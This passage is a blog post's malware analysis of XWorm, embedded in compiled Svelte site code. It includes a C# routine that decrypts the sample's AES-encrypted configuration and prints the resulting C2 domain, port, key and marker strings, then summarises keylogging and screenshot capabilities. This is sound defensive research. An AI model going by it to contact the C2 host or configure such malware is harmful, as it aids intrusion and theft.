#EEFFFF">Mutex</span><span style="color: #89DDFF">));</span></div><div class='line'><span style="color: #EEFFFF">        Array</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Copy</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">sourceArray</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> array</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">16</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        Array</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Copy</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">sourceArray</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> array</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">15</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">16</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        rijndaelManaged</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Key </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> array</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">        rijndaelManaged</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Mode </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> CipherMode</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">ECB</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #FFCB6B">ICryptoTransform</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">cryptoTransform</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> rijndaelManaged</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">CreateDecryptor</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">byte[]</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">array2</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> Convert</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">FromBase64String</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">input</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">byte[]</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">decryptedBytes</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> cryptoTransform</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">TransformFinalBlock</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">array2</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">0</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> array2</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Length</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">UTF8BS</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">decryptedBytes</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">private</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">byte[]</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">UTF8SB</span><span style="color: #89DDFF">(string</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">s</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> Encoding</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">UTF8</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">GetBytes</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">s</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">private</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">string</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">UTF8BS</span><span style="color: #89DDFF">(byte[]</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">b</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> Encoding</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">UTF8</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">GetString</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">b</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #F78C6C">class</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">Main2</span></div><div class='line'><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">public</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">static</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">void</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">Main</span><span style="color: #89DDFF">()</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Host </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> AlgorithmAES</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Decrypt</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Host</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        Console</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">WriteLine</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Decrypted Host: </span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Host</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Port </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> AlgorithmAES</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Decrypt</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Port</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        Console</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">WriteLine</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Decrypted Port: </span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">Port</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">KEY </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> AlgorithmAES</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Decrypt</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">KEY</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        Console</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">WriteLine</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Decrypted KEY: </span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">KEY</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">SPL </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> AlgorithmAES</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Decrypt</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">SPL</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        Console</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">WriteLine</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Decrypted SPL: </span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">SPL</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">USBNM </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> AlgorithmAES</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">Decrypt</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">USBNM</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        Console</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">WriteLine</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Decrypted USBNM: </span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> Settings</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">USBNM</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div></code></div></pre>`}<!-- HTML_TAG_END --> <p data-svelte-h="svelte-sv5aos">Finally, we can reveal the malware family used by threat actors:</p> <!-- HTML_TAG_START -->${`<pre class="shiki material-default with-title" style="background-color: #263238; color: #EEFFFF" bash="true" title="decrypted strings"><div class='code-title'>decrypted strings</div><div class="language-id">bash</div><div class='code-container'><code><div class='line dim'><span style="color: #EEFFFF">Decrypted Host: xwv5group7001.duckdns.org</span></div><div class='line dim'><span style="color: #EEFFFF">Decrypted Port: 7001</span></div><div class='line dim'><span style="color: #EEFFFF">Decrypted KEY: </span><span style="color: #89DDFF">&lt;</span><span style="color: #EEFFFF">1</span><span style="color: #89DDFF">23456789&gt;</span></div><div class='line highlight'><span style="color: #EEFFFF">Decrypted SPL: </span><span style="color: #89DDFF">&lt;</span><span style="color: #EEFFFF">Xwormmm</span><span style="color: #89DDFF">&gt;</span></div><div class='line dim'><span style="color: #EEFFFF">Decrypted USBNM: USB.exe</span></div></code></div></pre>`}<!-- HTML_TAG_END --> <p data-svelte-h="svelte-3hipc8">Taking a closer look at its functions in ILSpy, we find that it’s indeed <code>XWorm</code>. On internet, there is already a lot of research done on this malware. Even though, I will mention some of its capabilities: recording keystrokes, printscreens at specific interval of time and sending them to the attacker at random time (this jitter can be useful for bypassing network monitoring solutions). <code>Trellix</code> covered more rigorously this topic <a href="https://www.trellix.com/blogs/research/old-loader-new-threat-exploring-xworm/" rel="nofollow noopener noreferrer external" target="_blank">here</a>.</p> <h2 id="conclusion" data-svelte-h="svelte-kmpttn"><a href="#conclusion">Conclusion</a></h2> <p data-svelte-h="svelte-20trsz">The hunt is not over yet since we have valuable informations to work with. For instance, <code>xwv5group7001.duckdns.org</code> is a domain name registered by the attacker. It might provide additional information about his real identity, through OSINT techniques. Maybe the C2 infrastructured is poorly configured, leaving it vulnerable to attacks from defenders who are investigating this case. What about other clues left behind during this analysis process?</p> <p data-svelte-h="svelte-tpm7dn">Our jorney will end here for now, but it is worth investigating what hasn’t been covered in this post. Sometimes you end up finding interesting information:). Thank you for your undivided attention during this reading and don’t hesitate to contact me on social media for questions or feedback. Best wishes until next time!</p> ${validate_component(Profile, "Profile").$$render($$result, { subname: "KE", bio: "" }, {}, {
        default: () => {
          return `<div class="flex flex-col md:flex-row gap-4 mt-4 justify-center" data-svelte-h="svelte-l8738u"><a href="https://t.me/kwaabot" rel="noopener external" target="_blank" class="flex-1 relative overflow-hidden btn btn-block normal-case border-none no-underline bg-[#26a5e4] hover:bg-[#0088cc] flex items-center"><span class="i-simple-icons-telegram absolute w-16 h-16 left-10 opacity-20 fill-white transform-gpu transition-transform ease-in-out duration-500 group-hover:scale-125"></span> <span class="z-10 !text-white">@kryptoenix</span></a> <a href="https://discord.com/users/349550824202043392" rel="noopener external" target="_blank" class="flex-1 relative overflow-hidden btn btn-block normal-case border-none no-underline bg-[#5865f2] hover:bg-[#7983f5] flex items-center"><span class="i-simple-icons-discord absolute w-16 h-16 right-10 opacity-20 fill-white transform-gpu transition-transform ease-in-out duration-500 group-hover:scale-125"></span> <span class="z-10 !text-white">Kryptoenix#1929</span></a> <a href="https://t.me/kwaabot" rel="noopener external" target="_blank" class="flex-1 relative overflow-hidden btn btn-block normal-case border-none no-underline bg-[#424040] hover:bg-[#757272] flex items-center"><span class="i-simple-icons-telegram absolute w-16 h-16 left-10 opacity-20 fill-white transform-gpu transition-transform ease-in-out duration-500 group-hover:scale-125"></span> <span class="z-10 !text-white">📂 Kryptoenix</span></a></div>`;
        }
      })}`;
    }
  })}`;
});
const __vite_glob_0_1 = /* @__PURE__ */ Object.freeze(/* @__PURE__ */ Object.defineProperty({
  __proto__: null,
  default: Page_svelte,
  metadata
}, Symbol.toStringTag, { value: "Module" }));
const typeOfPost = (fm) => fm.title ? "article" : fm.image ? "photo" : fm.audio ? "audio" : fm.video ? "video" : fm.bookmark_of ? "bookmark" : fm.like_of ? "like" : fm.repost_of ? "repost" : fm.in_reply_to ? "reply" : "note";
const genPosts = ({
  modules = /* @__PURE__ */ Object.assign({ "/src/routes/about/+page.svelte.md": __vite_glob_0_0, "/src/routes/first-post/+page.svelte.md": __vite_glob_0_1 }),
  postHtml = false,
  postLimit = void 0,
  filterUnlisted = false
} = {}) => Object.entries(modules).map(([, module]) => ({
  ...module.metadata,
  type: typeOfPost(module.metadata),
  html: postHtml || typeOfPost(module.metadata) !== "article" ? module.default.render().html.replace(/[\u0000-\u001F]/g, "").replace(/[\r\n]/g, "").match(/<main [^>]+>(.*?)<\/main>/gi)?.[0].replace(/<main [^>]+>(.*?)<\/main>/gi, "$1").replace(/( style=")(.*?)(")/gi, "").replace(/(<span>)(.*?)(<\/span>)/gi, "$2").replace(/(<main>)(.*?)(<\/main>)/gi, "$2") : ""
})).filter((post, index) => (!filterUnlisted || !post.flags?.includes("unlisted")) && (!postLimit || index < postLimit)).sort((a, b) => Date.parse(b.published ?? b.created) - Date.parse(a.published ?? a.created));
const genTags = (posts) => [
  ...new Set(posts.reduce((acc, posts2) => posts2.tags ? [...acc, ...posts2.tags] : acc, [""]).slice(1))
];
export {
  Page_svelte$1 as P,
  genPosts as a,
  Page_svelte as b,
  metadata as c,
  genTags as g,
  metadata$1 as m
};
